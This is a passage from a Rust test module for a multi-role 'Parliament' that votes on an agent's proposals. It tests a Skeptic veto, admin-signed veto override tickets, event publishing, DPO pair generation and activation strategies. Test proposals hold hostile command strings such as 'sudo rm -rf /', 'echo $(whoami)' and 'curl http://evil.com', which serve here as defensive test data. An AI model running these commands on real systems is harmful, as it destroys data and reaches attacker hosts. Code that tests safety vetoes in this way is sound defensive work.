        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        let elapsed = start.elapsed();

        assert!(consensus.is_vetoed(), "应被否决");
        assert!(
            elapsed < Duration::from_millis(10),
            "否决延迟应 < 10ms,实际: {elapsed:?}"
        );
    }

    #[tokio::test]
    async fn test_skeptic_veto_skips_debate_no_vote_events() {
        // Skeptic 否决应跳过辩论,不发布 VoteCast 事件
        let bus = EventBus::new();
        let mut rx = bus.subscribe();

        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-mal", "q-1", "echo $(whoami)", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_vetoed());

        // 不应收到 VoteCast 事件(辩论被跳过)
        let mut found_vote = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "VoteCast" => {
                    found_vote = true;
                }
                _ => {}
            }
        }
        assert!(!found_vote, "Skeptic 否决不应发布 VoteCast 事件");
    }

    // === Week 5 Task 31:DPO 训练对生成测试 ===

    #[test]
    fn test_dpo_generator_generates_pair_on_reached_with_contrast() {
        let generator = DpoPairGenerator::new();
        let opinions = vec![
            Opinion::new(Role::Architect, 1.0, 0.85, "架构合理"),
            Opinion::new(Role::Skeptic, 0.0, 0.95, "风险过高"),
            Opinion::new(Role::Optimizer, 1.0, 0.80, "性能可接受"),
            Opinion::new(Role::Librarian, 0.0, 0.70, "无先例"),
            Opinion::new(Role::Bard, 1.0, 0.65, "创意好"),
        ];
        let consensus = Consensus::Reached {
            decision_hash: "abc123".into(),
            dpo_pair_id: None,
        };

        let pair = generator.generate("q-1", &opinions, &consensus).unwrap();

        // chosen = 赞成中置信度最高(Architect 0.85)
        assert!(pair.chosen.is_approve());
        assert_eq!(pair.chosen.role, Role::Architect);
        assert!((pair.chosen.confidence - 0.85).abs() < 1e-6);

        // rejected = 反对中置信度最高(Skeptic 0.95)
        assert!(pair.rejected.is_reject());
        assert_eq!(pair.rejected.role, Role::Skeptic);
        assert!((pair.rejected.confidence - 0.95).abs() < 1e-6);

        // context = quest_id:decision_hash
        assert_eq!(pair.context, "q-1:abc123");
        assert_eq!(pair.quest_id, "q-1");

        // pair_id 不为空
        assert!(!pair.pair_id.is_empty());
    }

    #[test]
    fn test_dpo_generator_no_pair_when_all_approve() {
        // 全赞成 → 无反对意见 → 不生成 DPO 对
        let generator = DpoPairGenerator::new();
        let opinions = vec![
            Opinion::new(Role::Architect, 1.0, 0.85, "赞成"),
            Opinion::new(Role::Skeptic, 1.0, 0.75, "低风险赞成"),
            Opinion::new(Role::Optimizer, 1.0, 0.80, "赞成"),
            Opinion::new(Role::Librarian, 1.0, 0.70, "赞成"),
            Opinion::new(Role::Bard, 1.0, 0.65, "赞成"),
        ];
        let consensus = Consensus::Reached {
            decision_hash: "abc".into(),
            dpo_pair_id: None,
        };

        assert!(
            generator.generate("q-1", &opinions, &consensus).is_none(),
            "全赞成不应生成 DPO 对(无对比)"
        );
    }

    #[test]
    fn test_dpo_generator_no_pair_on_rejected() {
        // 共识未达成 → 不生成 DPO 对
        let generator = DpoPairGenerator::new();
        let opinions = vec![Opinion::new(Role::Architect, 1.0, 0.9, "赞成")];
        let consensus = Consensus::Rejected {
            reason: "赞成率不足".into(),
        };

        assert!(generator.generate("q-1", &opinions, &consensus).is_none());
    }

    #[test]
    fn test_dpo_generator_no_pair_on_vetoed() {
        // 否决 → 不生成 DPO 对
        let generator = DpoPairGenerator::new();
        let opinions = vec![Opinion::new(Role::Skeptic, 0.0, 0.95, "否决")];
        let consensus = Consensus::Vetoed {
            veto_reason: "恶意意图".into(),
            frozen_capabilities: vec![],
        };

        assert!(generator.generate("q-1", &opinions, &consensus).is_none());
    }

    #[test]
    fn test_dpo_generator_pair_id_uniqueness() {
        // 多次生成 DPO 对,pair_id 应唯一
        let generator = DpoPairGenerator::new();
        let opinions = vec![
            Opinion::new(Role::Architect, 1.0, 0.85, "赞成"),
            Opinion::new(Role::Skeptic, 0.0, 0.95, "反对"),
        ];
        let consensus = Consensus::Reached {
            decision_hash: "abc".into(),
            dpo_pair_id: None,
        };

        let pair1 = generator.generate("q-1", &opinions, &consensus).unwrap();
        // WHY sleep:UUIDv7 含时间戳,确保时间戳不同以验证唯一性
        std::thread::sleep(std::time::Duration::from_millis(2));
        let pair2 = generator.generate("q-1", &opinions, &consensus).unwrap();

        assert_ne!(pair1.pair_id, pair2.pair_id, "DPO pair_id 应唯一");
    }

    #[tokio::test]
    async fn test_deliberate_generates_dpo_pair_on_consensus() {
        // 良性提案辩论后达成共识,且存在赞成/反对 → 生成 DPO 对
        // WHY 4 任务 + Standard:Architect 反对(>3),Skeptic 赞成(低风险),
        // Optimizer 弃权(Standard),Librarian 赞成(≤5),Bard 赞成
        // → 共识达成,且有反对意见(Architect)→ 生成 DPO 对
        let parliament = make_parliament();
        let quest = make_quest(4, ThinkingMode::Standard);
        let proposal = Proposal::new("p-1", "q-1", "执行代码审查", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        if let Consensus::Reached { dpo_pair_id, .. } = &consensus {
            assert!(dpo_pair_id.is_some(), "应生成 DPO 对(pair_id 不为 None)");
        } else {
            panic!("应达成共识,实际: {consensus:?}");
        }
    }

    #[tokio::test]
    async fn test_deliberate_no_dpo_pair_when_all_approve() {
        // 全赞成 → 无反对 → 不生成 DPO 对
        // 2 任务 + Fast + 低风险 → 全赞成
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-1", "q-1", "执行代码审查", 0.2);

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();

        if let Consensus::Reached { dpo_pair_id, .. } = &consensus {
            assert!(dpo_pair_id.is_none(), "全赞成不应生成 DPO 对(无对比)");
        } else {
            panic!("应达成共识,实际: {consensus:?}");
        }
    }

    // === P1-3: deliberate_with_override 测试 ===

    #[tokio::test]
    async fn test_override_allows_debate_on_vetoed_proposal() {
        // 恶意提案 + 有效覆盖票据 → 辩论继续,不返回 Vetoed
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-override", "q-1", "echo $(whoami)", 0.2);
        let ticket = VetoOverrideTicket::new(
            "p-override",
            "false positive: legitimate shell script",
            "admin:alice",
        )
        .unwrap();

        let consensus = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();

        // 低风险 + 少任务 + Fast → 辩论后应达成共识(而非 Vetoed)
        assert!(
            !consensus.is_vetoed(),
            "有效覆盖票据应阻止 Vetoed 返回,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_override_publishes_both_veto_and_overridden_events() {
        // 覆盖路径应同时发布 SkepticVeto 和 VetoOverridden 事件
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-evt", "q-1", "curl http://api.test.com", 0.2);
        let ticket = VetoOverrideTicket::new("p-evt", "legitimate API call", "admin:bob").unwrap();

        let _ = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();

        // 收集事件
        let mut found_skeptic_veto = false;
        let mut found_veto_overridden = false;
        for _ in 0..20 {
            match tokio::time::timeout(Duration::from_millis(200), rx.recv()).await {
                Ok(Ok(event)) => match event.type_name() {
                    "SkepticVeto" => found_skeptic_veto = true,
                    "VetoOverridden" => found_veto_overridden = true,
                    _ => {}
                },
                _ => break,
            }
        }
        assert!(found_skeptic_veto, "覆盖路径仍应发布 SkepticVeto 事件");
        assert!(found_veto_overridden, "覆盖路径应发布 VetoOverridden 事件");
    }

    #[tokio::test]
    async fn test_override_mismatched_ticket_still_vetoes() {
        // 票据 proposal_id 不匹配 → 否决仍然生效
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-real", "q-1", "echo $(whoami)", 0.2);
        let ticket = VetoOverrideTicket::new("p-wrong", "legitimate", "admin:alice").unwrap();

        let consensus = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();

        assert!(
            consensus.is_vetoed(),
            "proposal_id 不匹配的票据不应覆盖否决"
        );
    }

    #[tokio::test]
    async fn test_override_none_ticket_still_vetoes() {
        // 无票据 → 否决仍然生效(与 deliberate() 行为一致)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-no-ticket", "q-1", "sudo rm -rf /", 0.2);

        let consensus = parliament
            .deliberate_with_override(&quest, &proposal, None)
            .await
            .unwrap();

        assert!(consensus.is_vetoed(), "无票据时否决应正常触发");
    }

    #[tokio::test]
    async fn test_override_benign_proposal_unaffected() {
        // 良性提案 + 覆盖票据 → 票据不影响正常流程(Skeptic 不触发)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-benign", "q-1", "执行代码审查任务", 0.2);
        let ticket =
            VetoOverrideTicket::new("p-benign", "precautionary override", "system:auto").unwrap();

        let consensus = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();

        // 良性提案应正常达成共识(票据不触发任何覆盖逻辑)
        assert!(
            consensus.is_reached(),
            "良性提案应正常达成共识,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_override_path_publishes_debate_completed() {
        // M1-T1.1 度量盲区修复:deliberate_with_override 达成共识后应发布 DebateCompleted
        // (此前该路径无计时、无 DebateCompleted,reopen-veto 复审延迟不进协调度量)。
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-ovr-metric", "q-1", "执行代码审查任务", 0.2);
        let ticket =
            VetoOverrideTicket::new("p-ovr-metric", "precautionary", "system:auto").unwrap();

        let consensus = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();
        assert!(consensus.is_reached());

        // 应能收到 DebateCompleted 事件,strategy 标签区分 override 场景
        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                strategy,
                debate_latency_ms,
                outcome,
                ..
            } => {
                assert!(
                    strategy.contains("override"),
                    "override 路径 strategy 标签应含 override,实际: {strategy}"
                );
                assert!(debate_latency_ms >= 0.0, "应携带审议延迟");
                assert_eq!(outcome, "Reached");
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[tokio::test]
    async fn test_override_veto_no_ticket_publishes_debate_completed() {
        // 无票据否决短路:也应发布 DebateCompleted(outcome=Vetoed,无投票率)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-ovr-noticket", "q-1", "sudo rm -rf /", 0.9);

        // 不传票据 → Skeptic 否决短路
        let consensus = parliament
            .deliberate_with_override(&quest, &proposal, None)
            .await
            .unwrap();
        assert!(consensus.is_vetoed());

        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                strategy,
                weighted_approval_rate,
                outcome,
                ..
            } => {
                assert_eq!(strategy, "full-override");
                assert!(weighted_approval_rate.is_none(), "否决短路无投票数据");
                assert_eq!(outcome, "Vetoed");
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[tokio::test]
    async fn test_override_applied_but_vetoed_at_voting_publishes_debate_completed() {
        // override 生效(票据有效)→ 继续辩论,但 Skeptic 在投票阶段仍否决
        // → 验证 override_active=true 分支也发布 DebateCompleted(携带投票率)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-ovr-voting", "q-1", "sudo rm -rf /", 0.9);
        let ticket = VetoOverrideTicket::new("p-ovr-voting", "emergency", "admin:root").unwrap();

        let _ = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();

        // override 生效路径的 DebateCompleted 应携带投票率(经历了完整辩论+计票)
        match recv_debate_completed(&mut rx).await {
            NexusEvent::DebateCompleted {
                strategy,
                weighted_approval_rate,
                debate_latency_ms,
                ..
            } => {
                assert_eq!(strategy, "full-override");
                assert!(
                    weighted_approval_rate.is_some(),
                    "override 生效路径经历计票,应携带投票率"
                );
                assert!(debate_latency_ms >= 0.0);
            }
            other => panic!("Expected DebateCompleted, got {:?}", other.type_name()),
        }
    }

    #[tokio::test]
    async fn test_override_no_capability_frozen_on_override() {
        // 覆盖路径不应发布 CapabilityFrozen 事件
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-no-freeze", "q-1", "echo $(whoami)", 0.2);
        let ticket =
            VetoOverrideTicket::new("p-no-freeze", "false positive", "admin:alice").unwrap();

        let _ = parliament
            .deliberate_with_override(&quest, &proposal, Some(&ticket))
            .await
            .unwrap();

        // 不应收到 CapabilityFrozen 事件
        let mut found_frozen = false;
        for _ in 0..20 {
            match tokio::time::timeout(Duration::from_millis(200), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "CapabilityFrozen" => {
                    found_frozen = true;
                }
                _ => {}
            }
        }
        assert!(!found_frozen, "覆盖路径不应发布 CapabilityFrozen 事件");
    }

    // === P4-W14.3 S5 接缝:deliberate_with_policy 测试 ===

    // ============================================================
    // FastPath 策略测试
    // ============================================================

    #[tokio::test]
    async fn test_s5_fastpath_returns_reached_without_opinions() {
        // FastPath 跳过 Opinion 生成,直接返回 Reached
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // FastPath 应直接达成共识(无 Opinion 生成)
        assert!(consensus.is_reached(), "FastPath 应直接返回 Reached");
        // 无 DPO 训练对(无 Opinion 可提取)
        if let Consensus::Reached { dpo_pair_id, .. } = &consensus {
            assert!(dpo_pair_id.is_none(), "FastPath 不应生成 DPO 对");
        }
    }

    #[tokio::test]
    async fn test_s5_fastpath_skeptic_veto_still_triggers() {
        // FastPath 仍执行 Skeptic 否决检查(红队防线不可绕过)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        // 高风险 + 恶意模式 → Skeptic 否决
        let proposal = Proposal::new("p-fp-veto", "q-1", "sudo rm -rf /", 0.9);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 即使 FastPath,Skeptic 否决仍应触发
        assert!(
            consensus.is_vetoed(),
            "FastPath 不应绕过 Skeptic 否决,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_s5_fastpath_no_vote_cast_events() {
        // FastPath 跳过 Opinion 生成,不发布 VoteCast 事件
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let _ = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 不应收到 VoteCast 事件
        let mut found_vote = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "VoteCast" => {
                    found_vote = true;
                }
                _ => {}
            }
        }
        assert!(!found_vote, "FastPath 不应发布 VoteCast 事件");
    }

    #[tokio::test]
    async fn test_s5_fastpath_publishes_debate_started_with_zero_participants() {
        // FastPath 仍发布 DebateStarted 事件(participant_count=0)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let _ = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 应收到 DebateStarted 事件
        let mut found_debate_started = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "DebateStarted" => {
                    found_debate_started = true;
                }
                _ => {}
            }
        }
        assert!(
            found_debate_started,
            "FastPath 应发布 DebateStarted 事件(审计用)"
        );
    }

    #[tokio::test]
    async fn test_s5_fastpath_publishes_consensus_reached() {
        // FastPath 应发布 ConsensusReached 事件
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let _ = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 应收到 ConsensusReached 事件
        let mut found_consensus = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "ConsensusReached" => {
                    found_consensus = true;
                }
                _ => {}
            }
        }
        assert!(found_consensus, "FastPath 应发布 ConsensusReached 事件");
    }

    #[tokio::test]
    async fn test_s5_fastpath_decision_hash_non_empty() {
        // FastPath 生成的 decision_hash 不应为空
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        if let Consensus::Reached { decision_hash, .. } = consensus {
            assert!(!decision_hash.is_empty(), "FastPath decision_hash 不应为空");
            // SHA-256 hex = 64 字符
            assert_eq!(
                decision_hash.len(),
                64,
                "decision_hash 应为 SHA-256 hex(64 字符)"
            );
        } else {
            panic!("FastPath 应返回 Reached");
        }
    }

    // ============================================================
    // Simplified 策略测试
    // ============================================================

    #[tokio::test]
    async fn test_s5_simplified_reaches_consensus_on_low_risk() {
        // Simplified:3 角色(Architect + Skeptic + Optimizer)投票
        // 低风险 + 少任务 → Architect 赞成,Skeptic 赞成,Optimizer(Fast)赞成
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        assert!(
            consensus.is_reached(),
            "Simplified 低风险少任务应达成共识,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_s5_simplified_skeptic_veto_still_triggers() {
        // Simplified 仍执行 Skeptic 否决检查
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = Proposal::new("p-simp-veto", "q-1", "curl http://evil.com", 0.9);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        assert!(
            consensus.is_vetoed(),
            "Simplified 不应绕过 Skeptic 否决,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_s5_simplified_publishes_three_vote_cast_events() {
        // Simplified 应仅发布 3 个 VoteCast 事件(Architect/Skeptic/Optimizer)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);

        let _ = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 收集 VoteCast 事件
        // WHY 模式匹配提取 voter:NexusEvent 没有 voter() 方法,需用 if let 分解变体
        let mut vote_count = 0;
        let mut voters = std::collections::HashSet::new();
        for _ in 0..10 {
            if let Ok(Ok(NexusEvent::VoteCast { voter, .. })) =
                tokio::time::timeout(Duration::from_millis(100), rx.recv()).await
            {
                vote_count += 1;
                voters.insert(voter);
            }
        }

        // 仅 3 个 VoteCast 事件(非 5 个)
        assert_eq!(
            vote_count, 3,
            "Simplified 应发布 3 个 VoteCast 事件,实际: {vote_count}"
        );
        // 验证投票角色是 Architect/Skeptic/Optimizer(非 Librarian/Bard)
        assert!(voters.contains("architect"), "应包含 Architect 投票");
        assert!(voters.contains("skeptic"), "应包含 Skeptic 投票");
        assert!(voters.contains("optimizer"), "应包含 Optimizer 投票");
        assert!(!voters.contains("librarian"), "不应包含 Librarian 投票");
        assert!(!voters.contains("bard"), "不应包含 Bard 投票");
    }

    #[tokio::test]
    async fn test_s5_simplified_debate_started_three_participants() {
        // Simplified 应发布 DebateStarted 事件(participant_count=3)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);

        let _ = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 应收到 DebateStarted 事件
        let mut found_debate = false;
        for _ in 0..10 {
            match tokio::time::timeout(Duration::from_millis(100), rx.recv()).await {
                Ok(Ok(event)) if event.type_name() == "DebateStarted" => {
                    found_debate = true;
                }
                _ => {}
            }
        }
        assert!(found_debate, "Simplified 应发布 DebateStarted 事件");
    }

    // ============================================================
    // Full 策略测试(验证既有行为保持不变)
    // ============================================================

    #[tokio::test]
    async fn test_s5_full_reaches_consensus_on_low_risk() {
        // Full:5 角色完整辩论(与既有 deliberate() 行为一致)
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Full);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        assert!(
            consensus.is_reached(),
            "Full 低风险少任务应达成共识,实际: {consensus:?}"
        );
    }

    #[tokio::test]
    async fn test_s5_full_publishes_five_vote_cast_events() {
        // Full 应发布 5 个 VoteCast 事件(全部 5 角色)
        let bus = EventBus::new();
        let mut rx = bus.subscribe();
        let parliament = Parliament::new(ParliamentConfig::default(), bus);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Full);

        let _ = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        // 收集 VoteCast 事件
        // WHY 模式匹配提取 voter:NexusEvent 没有 voter() 方法,需用 if let 分解变体
        let mut vote_count = 0;
        let mut voters = std::collections::HashSet::new();
        for _ in 0..15 {
            if let Ok(Ok(NexusEvent::VoteCast { voter, .. })) =
                tokio::time::timeout(Duration::from_millis(100), rx.recv()).await
            {
                vote_count += 1;
                voters.insert(voter);
            }
        }

        assert_eq!(
            vote_count, 5,
            "Full 应发布 5 个 VoteCast 事件,实际: {vote_count}"
        );
        // 验证全部 5 角色投票
        assert!(voters.contains("architect"));
        assert!(voters.contains("skeptic"));
        assert!(voters.contains("optimizer"));
        assert!(voters.contains("librarian"));
        assert!(voters.contains("bard"));
    }

    #[tokio::test]
    async fn test_s5_full_high_risk_vetoes() {
        // Full 高风险应触发 Skeptic 否决
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.8);
        let policy = ParliamentPolicy::static_policy(ActivationStrategy::Full);

        let consensus = parliament
            .deliberate_with_policy(&quest, &proposal, &policy)
            .await
            .unwrap();

        assert!(consensus.is_vetoed(), "Full 高风险应触发否决");
    }

    // ============================================================
    // deliberate() 与 learner_holder 集成测试
    // ============================================================

    #[tokio::test]
    async fn test_s5_deliberate_uses_holder_default_full_policy() {
        // 默认 holder = Static(Full),deliberate() 应使用 Full 路径
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 验证默认策略
        assert_eq!(
            parliament.learner_holder().strategy(),
            ActivationStrategy::Full
        );

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_reached(), "默认 Full 策略应达成共识");
    }

    #[tokio::test]
    async fn test_s5_deliberate_uses_holder_updated_fastpath_policy() {
        // 更新 holder 为 Learned(FastPath),deliberate() 应使用 FastPath 路径
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 更新策略为 FastPath
        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(1, ActivationStrategy::FastPath));
        assert_eq!(
            parliament.learner_holder().strategy(),
            ActivationStrategy::FastPath
        );

        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        // FastPath 直接返回 Reached(无 Opinion 生成)
        assert!(consensus.is_reached(), "FastPath 应直接返回 Reached");
        // 无 DPO 对(无 Opinion 可提取)
        if let Consensus::Reached { dpo_pair_id, .. } = consensus {
            assert!(dpo_pair_id.is_none(), "FastPath 不应生成 DPO 对");
        }
    }

    #[tokio::test]
    async fn test_s5_deliberate_fallback_to_static_after_learned() {
        // Learned → fallback_to_static → 应回到 Full 行为
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 1. 切换到 Learned(Simplified)
        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(1, ActivationStrategy::Simplified));
        assert!(parliament.learner_holder().is_learned());

        // 2. 触发熔断:fallback_to_static
        parliament.learner_holder().fallback_to_static();
        assert!(!parliament.learner_holder().is_learned());
        assert_eq!(
            parliament.learner_holder().strategy(),
            ActivationStrategy::Full
        );

        // 3. deliberate() 应回到 Full 行为(5 角色,生成 DPO 对)
        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_reached(), "Full 策略应达成共识");
    }

    // ============================================================
    // C4 合规测试
    // ============================================================

    #[tokio::test]
    async fn test_s5_c4_default_static_full_backward_compatible() {
        // C4 合规:默认 Static(Full) = P4 修复前行为
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 默认策略 = Static(Full)
        let policy = parliament.learner_holder().current_policy();
        assert!(policy.is_static());
        assert_eq!(policy.strategy(), ActivationStrategy::Full);

        // 行为应与 P4 修复前 deliberate() 一致
        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_reached());
    }

    #[tokio::test]
    async fn test_s5_c4_local_fallback_on_learner_panic() {
        // 模拟: learner 下发 Learned 后 panic,调用方 fallback_to_static
        let parliament = make_parliament();
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // 1. learner 下发 Learned(FastPath)
        parliament
            .learner_holder()
            .update_policy(ParliamentPolicy::learned(1, ActivationStrategy::FastPath));
        assert!(parliament.learner_holder().is_learned());

        // 2. 模拟 panic:调用方触发 fallback
        parliament.learner_holder().fallback_to_static();
        assert!(!parliament.learner_holder().is_learned());

        // 3. deliberate() 应正常工作(回到 Full 行为)
        let consensus = parliament.deliberate(&quest, &proposal).await.unwrap();
        assert!(consensus.is_reached(), "fallback 后应正常审议");
    }

    #[tokio::test]
    async fn test_s5_c4_no_runtime_flag_query() {
        // C4 合规:策略值从 Copy 枚举获取,无运行时旗标查询
        let parliament = make_parliament();

        // current_policy() 返回 Copy 枚举,无全局 static 查询
        let policy1 = parliament.learner_holder().current_policy();
        let policy2 = parliament.learner_holder().current_policy();
        assert_eq!(policy1, policy2); // 同一快照

        // 策略值通过 const 常量获取
        assert_eq!(policy1.strategy(), ActivationStrategy::Full);
    }

    // ============================================================
    // 三策略对比测试(验证策略确实影响行为)
    // ============================================================

    #[tokio::test]
    async fn test_s5_three_strategies_produce_different_vote_counts() {
        // 同一提案 + 同一 quest,三种策略应产生不同数量的 VoteCast 事件
        let bus1 = EventBus::new();
        let mut rx1 = bus1.subscribe();
        let p1 = Parliament::new(ParliamentConfig::default(), bus1);
        let quest = make_quest(2, ThinkingMode::Fast);
        let proposal = make_proposal(0.2);

        // FastPath
        let policy_fp = ParliamentPolicy::static_policy(ActivationStrategy::FastPath);
        let _ = p1
            .deliberate_with_policy(&quest, &proposal, &policy_fp)
            .await
            .unwrap();
        let fp_votes = count_vote_cast_events(&mut rx1, 10).await;

        // Simplified
        let bus2 = EventBus::new();
        let mut rx2 = bus2.subscribe();
        let p2 = Parliament::new(ParliamentConfig::default(), bus2);
        let policy_s = ParliamentPolicy::static_policy(ActivationStrategy::Simplified);
        let _ = p2
            .deliberate_with_policy(&quest, &proposal, &policy_s)
            .await
            .unwrap();
        let s_votes = count_vote_cast_events(&mut rx2, 10).await;

        // Full
        let bus3 = EventBus::new();
        let mut rx3 = bus3.subscribe();
        let p3 = Parliament::new(ParliamentConfig::default(), bus3);
        let policy_f = ParliamentPolicy::static_policy(ActivationStrategy::Full);
        let _ = p3
            .deliberate_with_policy(&quest, &proposal, &policy_f)
            .await
            .unwrap();
        let f_votes = count_vote_cast_events(&mut rx3, 15).await;

        // FastPath=0,Simplified=3,Full=5
        assert_eq!(fp_votes, 0, "FastPath 应无 VoteCast 事件");
